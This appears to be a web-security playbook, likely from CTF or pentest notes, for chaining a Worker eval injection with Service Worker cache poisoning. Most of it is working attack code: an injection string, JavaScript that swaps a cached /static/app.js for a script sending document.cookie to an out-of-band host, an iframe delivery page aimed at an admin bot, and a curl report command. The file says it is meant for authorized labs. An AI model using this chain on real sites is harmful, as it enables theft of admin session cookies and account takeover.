# Worker Eval Cache Poison + Same-Profile Bot Delivery

## Context

Use when:

- a dedicated Worker `eval`s attacker-controlled path/query/message data
- a Service Worker cache-first serves a main-thread script (e.g. `/static/app.js`)
- an admin/report bot visits URLs, especially **external** ones
- separate bot visits appear not to keep Cache API state

## Requirements

- Authorized lab, owned app, in-scope target, or defensive review
- Do not store live flags, cookies, tokens, or private OAST URLs in reusable files

## Worker Injection Skeleton

```text
/page/history/<id>-') > -1 || (ATTACK), ('
```

Adjust prefix to match how the worker receives `pathname` / `decodeURIComponent`.

## Cache Poison (runs in Worker)

```js
caches.open('contenthub-v1').then(c =>
  c.put(
    '/static/app.js',
    new Response(
      "location.replace('https://[oast]/d?'+encodeURIComponent(JSON.stringify({c:document.cookie})));",
      { headers: { 'Content-Type': 'application/javascript' } }
    )
  )
).then(() => fetch('https://[oast]/ok'));
self.postMessage({ results: [] });
```

Replace `contenthub-v1` / `/static/app.js` with values from the target `sw.js`.

## Same-Profile Delivery Page (report this URL)

```html
<!doctype html>
<html><body>
<script>
(async () => {
  const poison = 'https://[lab]/page/history/[encoded-injection]';
  const lab = 'https://[lab]/';
  const ifr = document.createElement('iframe');
  ifr.src = poison;
  document.body.appendChild(ifr);
  await new Promise(r => setTimeout(r, 4000));
  location.replace(lab);
})();
</script>
</body></html>
```

## Report

```bash
curl -s -X POST "https://[lab]/report" -F "url=https://[exploit-host]/"
```

## Expected Signal

- OAST `/ok` while iframe loads poison path
- OAST `/d?...` after top navigation with cookie payload
- Two separate `/report` visits often only show `/ok` (no main-thread hit)

## Why This Shape

| Piece | Role |
|-------|------|
| Worker `eval` | Code exec without main-thread XSS yet |
| Cache API `put` | Persist malicious main-thread script |
| External page + iframe | Poison in bot profile |
| `location.replace(lab)` | Reload origin so SW serves poison |
| Sync `location.replace(oast+data)` | Beat bot teardown vs async `fetch` |

## Related

- `notes/worker-eval-sw-cache-poison.md`
- `writeups/simple-worker-eval-sw-cache-poison.md`
- `checklists/admin-bot-xss-recon.md`
